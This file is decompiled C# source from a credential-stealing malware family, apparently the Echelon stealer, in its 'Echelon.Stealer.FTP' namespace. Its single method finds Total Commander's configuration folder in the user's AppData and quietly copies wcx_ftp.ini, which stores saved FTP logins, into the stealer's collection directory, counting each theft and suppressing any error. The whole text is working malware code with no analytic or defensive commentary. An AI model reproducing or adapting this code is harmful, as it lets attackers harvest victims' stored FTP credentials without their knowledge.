using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.FTP
{
	// Token: 0x02000019 RID: 25
	internal class TotalCommander
	{
		// Token: 0x06000045 RID: 69 RVA: 0x000047F8 File Offset: 0x000029F8
		public static void GetTotalCommander(string Echelon_Dir)
		{
			try
			{
				string text = Help.AppDate + "\\GHISLER\\";
				if (Directory.Exists(text))
				{
					Directory.CreateDirectory(Echelon_Dir + "\\FTP\\Total Commander");
				}
				FileInfo[] files = new DirectoryInfo(text).GetFiles();
				for (int i = 0; i < files.Length; i++)
				{
					if (files[i].Name.Contains("wcx_ftp.ini"))
					{
						File.Copy(text + "wcx_ftp.ini", Echelon_Dir + "\\FTP\\Total Commander\\wcx_ftp.ini");
						TotalCommander.count++;
					}
				}
			}
			catch
			{
			}
		}

		// Token: 0x04000038 RID: 56
		public static int count;
	}
}
